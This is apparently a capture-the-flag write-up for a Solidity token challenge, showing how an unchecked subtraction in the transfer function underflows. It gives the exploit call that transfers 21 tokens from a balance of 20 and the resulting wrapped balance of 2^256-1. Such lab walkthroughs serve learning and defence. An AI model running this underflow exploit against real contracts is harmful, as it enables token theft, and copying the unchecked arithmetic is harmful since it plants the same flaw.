# Acquire more token than you should

When the `transfer` function prompted, `balances[msg.sender]` is 20 and `_value` is 21. 
 ```
 require(balances[msg.sender] - _value >= 0);
 ```

 This will cause when deduct `_value` from `balances[msg.sender]` underflow will occur
 ```
 balances[msg.sender] -= _value;
 ```

 When the function deduct 20 - 21 = 2^256 - 1 due to underflow

 We just need to transfer an amount of 21 to contract
 ```
 contract.transfer('0x0000000000000000000000000000000000000000' ,21)
 ```

 To verify we can check balance
 ```
 contract.balanceOf(player).then(x => x.toString())
 // Output: 115792089237316195423570985008687907853269984665640564039457584007913129639935
 ```



